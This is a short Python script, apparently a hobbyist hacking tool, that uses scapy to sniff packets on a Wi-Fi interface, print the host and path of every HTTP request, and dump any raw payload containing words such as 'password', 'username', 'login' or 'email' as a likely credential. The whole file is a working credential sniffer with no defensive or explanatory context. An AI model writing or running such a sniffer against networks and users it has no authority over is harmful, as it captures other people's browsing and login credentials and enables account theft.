import scapy.all as sc
from scapy_http import http
def sniffy():
    sc.sniff(iface="Wi-Fi2",store=False,prn=fx)
def fx(packet):
    if(packet.haslayer(http.HTTPRequest)):
        url=packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print ("[+]-\tURLS:  "+(url).decode('ascii'))
        login_id=getLogin(packet)
        if login_id:
            print ("\t***** LOGIN MAYBE!!!!:\n\n")
            print (login_id)
            print ("\n\n**********")

def getLogin(p):
    if p.haslayer(sc.Raw):
        load=(p[sc.Raw].load).decode('ascii')
        keyc=["login", "password", "username", "user", "pass","email","name"]
        for key in keyc:
            if key in load:
                return load
while True:
    sniffy()